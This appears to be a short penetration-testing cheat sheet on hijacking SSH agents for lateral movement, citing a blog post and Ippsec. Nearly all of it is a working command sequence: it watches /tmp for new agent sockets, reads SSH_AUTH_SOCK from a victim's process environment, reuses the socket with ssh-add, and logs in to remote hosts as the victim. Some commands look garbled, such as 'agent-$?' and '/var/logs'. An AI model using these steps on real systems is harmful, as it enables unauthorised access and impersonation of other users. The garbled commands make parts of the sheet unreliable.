#### SSH Hijack: Abusing SSH Agents to intercept the "SSO Like Token"  ####

**NOTE: https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/**

##### Check logins #####

```w```

```cd /var/logs```

```grep -R -i root . -a```

```cd /etc/ssh```

```nano ssh_config```

**Is 'ForwardAgent == yes'?**

```cd /tmp```

*NOTE: Remove existing ssh-* files from grepping to remove active sessions*

```watch -n 1 "ls | grep -v 'ssh-$?\|ssh-$?'"```

*NOTE:  Wait for new event to appear*

```cd ssh-new-event```

```ls```

```SSH_AUTH_SOCK=agent-$? ssh root@target -p 2222```

*NOTE: Try without port two. This example is copied from Ippsec.*

#### SSH Hijack 2 ####

*NOTE: https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/*

##### Attacker finds the SSHd process of the victim #####

```ps uax|grep sshd```
 
##### Attacker looks for the SSH_AUTH_SOCK on victim's environment variables #####

```grep SSH_AUTH_SOCK /proc/<pid>/environ```
 
##### Attacker hijack's victim's ssh-agent socket #####

```SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXX/agent.XXXX ssh-add -l```
 
##### Attacker can login to remote systems as the victim #####

```ssh remote_system -l victim```
